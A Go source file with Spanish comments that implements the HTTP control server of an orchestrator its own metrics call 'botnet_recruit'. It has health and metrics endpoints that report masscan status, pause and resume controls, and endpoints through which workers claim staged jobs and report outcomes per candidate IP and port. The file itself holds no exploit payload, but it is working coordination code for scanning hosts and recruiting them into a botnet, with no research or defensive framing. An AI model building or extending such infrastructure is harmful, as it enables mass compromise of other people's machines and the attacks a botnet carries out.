package recruit

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"strconv"
	"time"
)

// API es el servidor de control del orquestador. Puerto propio (9110) para
// no chocar con api, gw ni rdv (A2-17).
type API struct {
	Store     *Store
	MasscanOK func() bool
	RateClass func() int
	mux       *http.ServeMux
}

// Handler monta las rutas.
func (a *API) Handler() http.Handler {
	if a.mux != nil {
		return a.mux
	}
	m := http.NewServeMux()
	m.HandleFunc("/healthz", a.healthz)
	m.HandleFunc("/metrics", a.metrics)
	m.HandleFunc("/v1/control/pause", a.pause(true))
	m.HandleFunc("/v1/control/resume", a.pause(false))
	m.HandleFunc("/v1/work/claim", a.claim)
	m.HandleFunc("/v1/work/complete", a.complete)
	a.mux = m
	return m
}

// healthz: 200 solo con latido fresco. Un proceso vivo pero mudo es 503
// (A2-03); lo que se publica va con `clave=valor` para el grep del gate.
func (a *API) healthz(w http.ResponseWriter, r *http.Request) {
	ctx, cancel := context.WithTimeout(r.Context(), 2*time.Second)
	defer cancel()
	masscanOK := true
	if a.MasscanOK != nil {
		masscanOK = a.MasscanOK()
	}
	h, err := a.Store.Health(ctx, masscanOK)
	code := http.StatusOK
	status := "ok"
	switch {
	case err != nil:
		code, status = http.StatusServiceUnavailable, "db_down"
	case h.TickAge > StaleAfter:
		code, status = http.StatusServiceUnavailable, "stale"
	case h.Paused:
		status = "paused"
	}
	w.Header().Set("content-type", "text/plain; charset=utf-8")
	w.WriteHeader(code)
	// Una clave por linea: el gate las cuenta con grep.
	fmt.Fprintf(w, "status=%s\n", status)
	fmt.Fprintf(w, "db=%t\n", err == nil)
	fmt.Fprintf(w, "masscan=%t\n", masscanOK)
	fmt.Fprintf(w, "tick_age_s=%d\n", int(h.TickAge.Seconds()))
	fmt.Fprintf(w, "rate_class=%d\n", h.RateClass)
}

// metrics publica los gauges del servicio en formato Prometheus.
func (a *API) metrics(w http.ResponseWriter, r *http.Request) {
	ctx, cancel := context.WithTimeout(r.Context(), 2*time.Second)
	defer cancel()
	w.Header().Set("content-type", "text/plain; version=0.0.4")
	h, err := a.Store.Health(ctx, true)
	if err != nil {
		w.WriteHeader(http.StatusServiceUnavailable)
		fmt.Fprintf(w, "botnet_recruit_db_up 0\n")
		return
	}
	fmt.Fprintf(w, "# TYPE botnet_recruit_orchestrator_tick_age_seconds gauge\n")
	fmt.Fprintf(w, "botnet_recruit_orchestrator_tick_age_seconds %d\n", int(h.TickAge.Seconds()))
	fmt.Fprintf(w, "# TYPE botnet_recruit_rate_class gauge\n")
	fmt.Fprintf(w, "botnet_recruit_rate_class %d\n", h.RateClass)
	fmt.Fprintf(w, "botnet_recruit_paused %d\n", boolToInt(h.Paused))
	fmt.Fprintf(w, "# TYPE botnet_recruit_claim_latency_ms gauge\n")
	fmt.Fprintf(w, "botnet_recruit_claim_latency_ms %d\n", a.Store.ClaimP95())
}

func boolToInt(b bool) int {
	if b {
		return 1
	}
	return 0
}

func (a *API) pause(paused bool) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "POST", http.StatusMethodNotAllowed)
			return
		}
		ctx, cancel := context.WithTimeout(r.Context(), 3*time.Second)
		defer cancel()
		if err := a.Store.SetPaused(ctx, paused); err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
		w.WriteHeader(http.StatusOK)
		fmt.Fprintf(w, "paused=%t\n", paused)
	}
}

// claimResp es la respuesta del reparto.
type claimResp struct {
	Stage  string    `json:"stage"`
	Worker string    `json:"worker"`
	Items  []Claimed `json:"items"`
}

// claim reparte trabajo. Con el control en pausa responde 204: pausado no
// es un error, pero tampoco hay carga (T-1605 AC4).
func (a *API) claim(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "POST", http.StatusMethodNotAllowed)
		return
	}
	var body struct {
		Stage  string `json:"stage"`
		Worker string `json:"worker"`
		Limit  int    `json:"limit"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		http.Error(w, "json invalido", http.StatusBadRequest)
		return
	}
	if body.Stage == "" || body.Worker == "" {
		http.Error(w, "stage y worker obligatorios", http.StatusBadRequest)
		return
	}
	if q := r.URL.Query().Get("limit"); q != "" {
		if n, err := strconv.Atoi(q); err == nil {
			body.Limit = n
		}
	}
	ctx, cancel := context.WithTimeout(r.Context(), 5*time.Second)
	defer cancel()
	h, err := a.Store.Health(ctx, true)
	if err != nil {
		http.Error(w, err.Error(), http.StatusServiceUnavailable)
		return
	}
	if h.Paused {
		w.WriteHeader(http.StatusNoContent)
		return
	}
	items, err := a.Store.ClaimJobs(ctx, body.Stage, body.Worker, body.Limit)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	w.Header().Set("content-type", "application/json")
	json.NewEncoder(w).Encode(claimResp{Stage: body.Stage, Worker: body.Worker, Items: items})
}

// complete cierra un intento. Un duplicado responde 200 y no duplica nada.
func (a *API) complete(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "POST", http.StatusMethodNotAllowed)
		return
	}
	var body struct {
		CandidateID int64  `json:"candidate_id"`
		IP          string `json:"ip"`
		Port        int    `json:"port"`
		Stage       string `json:"stage"`
		Attempt     int    `json:"attempt"`
		Outcome     string `json:"outcome"`
		Reason      string `json:"reason"`
		Worker      string `json:"worker"`
		LeaseToken  int64  `json:"lease_token"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		http.Error(w, "json invalido", http.StatusBadRequest)
		return
	}
	if body.CandidateID == 0 || body.Stage == "" || body.Outcome == "" {
		http.Error(w, "candidate_id, stage y outcome obligatorios", http.StatusBadRequest)
		return
	}
	if body.Attempt < 1 {
		body.Attempt = 1
	}
	ctx, cancel := context.WithTimeout(r.Context(), 5*time.Second)
	defer cancel()
	c := Claimed{CandidateID: body.CandidateID, IP: body.IP, Port: body.Port,
		Stage: body.Stage, Attempt: body.Attempt, LeaseOwner: body.Worker,
		LeaseToken: body.LeaseToken}
	escribio, err := a.Store.Complete(ctx, c, body.Outcome, body.Reason, body.Worker)
	if err != nil && !errors.Is(err, ErrLeaseStale) {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	w.Header().Set("content-type", "application/json")
	json.NewEncoder(w).Encode(map[string]any{"ok": true, "escribio": escribio})
}
